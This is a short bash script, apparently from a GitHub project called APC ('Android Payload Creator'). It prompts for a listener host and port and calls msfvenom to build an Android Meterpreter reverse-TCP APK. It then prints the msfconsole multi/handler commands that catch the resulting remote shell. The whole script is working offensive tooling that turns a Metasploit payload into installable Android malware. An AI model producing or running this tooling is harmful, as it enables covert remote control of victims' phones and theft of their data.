#!/bin/bash

# text color
black=$'\e[0;30m'
red=$'\e[0;31m'
green=$'\e[0;32m'
yellow=$'\e[0;33m'
blue=$'\e[0;34m'
purple=$'\e[0;35m'
cyan=$'\e[0;36m'
gray=$'\e[0;90m'
light_red=$'\e[0;91m'
light_green=$'\e[0;92m'
light_yellow=$'\e[0;93m'
light_blue=$'\e[0;94m'
white=$'\e[0;37m'

# text format
reset=$'\e[0m'
bold=$'\e[1m'
faint=$'\e[2m'
italics=$'\e[3m'
underline=$'\e[4m'

# background color
bg_black=$'\e[0;40m'
bg_red=$'\e[0;41m'
bg_green=$'\e[0;42m'

alias apc="bash apc.sh"

if (( $EUID == 0 )); then
    echo "Please do not run as root"
    exit
fi

clear

cat << "EOF"
         -o          o-
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      `dMMm NMMMMMMN mMMd`
      hMMMMMMMMMMMMMMMMMMh
EOF

echo -e "\n$reset$bold              APC$reset"
echo -e "    Android Payload Creator.\n"
sleep 3
echo -e "$reset Author:$blue Haitham Aouati"
echo -e "$reset Version:$light_yellow 1.0 $white\n"
echo -e "$reset Repo: https://github.com/haithamaouati/apc\n"

read -p 'LHOST (e.g. 127.0.0.1): ' host
read -p 'LPORT (e.g. 4444): ' port
read -p 'Output (e.g. payload.apk): ' output
sleep 3
echo -e "\n$light_green[+]$reset Lhost: $host"
echo -e "$light_green[+]$reset Lport: $port"
echo -e "$light_green[+]$reset Output: $output\n"
echo -e "$light_green[*]$reset Creating payload...\n"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > $output
echo -e "$light_green[✓]$reset Payload created.\n"

echo -e "Type:\n"
echo -e " msfconsole"
echo -e " use multi/handler"
echo -e " set payload android/meterpreter/reverse_tcp"
echo -e " set Lhost $host"
echo -e " set Lport $port"
echo -e " exploit\n"
